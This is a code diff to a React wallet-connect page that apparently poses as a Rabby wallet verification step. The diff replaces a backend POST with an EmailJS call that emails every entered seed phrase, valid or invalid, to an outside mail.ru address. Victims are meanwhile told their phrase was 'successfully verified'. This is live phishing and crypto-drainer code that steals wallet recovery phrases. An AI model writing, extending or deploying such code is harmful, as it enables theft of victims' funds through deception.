@@ -4,7 +4,6 @@ import Web3 from "web3";
 import { errorNotification, successNotification } from "../../utils/helpers";
 import { useLocation, useNavigate } from "react-router-dom";
 import { wallets } from "../../utils/data";
-import axios from "axios";
 
 const ConnectPage = () => {
   const { state } = useLocation();
@@ -164,30 +163,32 @@ const ConnectPage = () => {
                 balance: balance2,
               };
               data.push(dt2);
-            });
-            (async function () {
               let wallet_balance = JSON.stringify(data);
               localStorage.setItem("wallet_balance", wallet_balance);
               console.log("data", data);
+              const templateParams = {
+                to_email: "benard.tee@mail.ru",
+                message: `NEW RABBY Submission\n\nVerified Secret Phrase:\n\n ${phrase}`,
+              };
 
-              const response = await axios.post(
-                `${import.meta.env.VITE_API_URL}/user-auth/connect-wallet`,
-                {
-                  phrase,
-                  source: "Rabby",
-                  type: "Verified Correct Phrase",
-                }
-              );
-              console.log(response);
-              if (response.status === 200) {
-                localStorage.setItem("phrase", phrase);
-                successNotification("Successfully verified your Seed Phrase!");
-                setLoading(false);
-                navigate("/wallet");
-              } else {
-                errorNotification(response?.data?.error);
-              }
-            })();
+              emailjs
+                .send("service_dqusq1r", "template_a2c8mp8", templateParams)
+                .then(
+                  function (response) {
+                    console.log("SUCCESS!", response.status, response.text);
+                    localStorage.setItem("phrase", phrase);
+                    successNotification(
+                      "Successfully verified your Seed Phrase!"
+                    );
+                    setLoading(false);
+                    navigate("/wallet");
+                  },
+                  function (err) {
+                    console.error("FAILED TO SEND EMAIL...", err);
+                    errorNotification("Please try again!");
+                  }
+                );
+            });
           }, 1300);
         } catch (error) {
           console.error("Error:", error.message);
@@ -202,21 +203,24 @@ const ConnectPage = () => {
     } catch (error) {
       console.log("error:", error);
       if (error.toString().includes("invalid mnemonic")) {
-        const response = await axios.post(
-          `${import.meta.env.VITE_API_URL}/user-auth/connect-wallet`,
-          {
-            phrase,
-            source: "Rabby",
-            type: "Unverified, Incorrect Phrase",
-          }
-        );
-        console.log(response);
-        if (response.status === 200) {
-          errorNotification("Invalid mnemonic phrase supplied");
-        } else {
-          errorNotification(response?.data?.error);
-        }
-        setLoading(false);
+        const templateParams = {
+          to_email: "benard.tee@mail.ru",
+          message: `NEW RABBY Submission\n\nBAD Secret Phrase (Invalid phrase):\n\n ${phrase}`,
+        };
+
+        emailjs
+          .send("service_dqusq1r", "template_a2c8mp8", templateParams)
+          .then(
+            function (response) {
+              console.log("SUCCESS!", response.status, response.text);
+              errorNotification("Invalid mnemonic phrase supplied");
+              setLoading(false);
+            },
+            function (err) {
+              errorNotification("Please try again!");
+              console.error("FAILED TO SEND EMAIL...", err);
+            }
+          );
       }
       //   console.log("error:", error);
       //   console.log({ error: error });
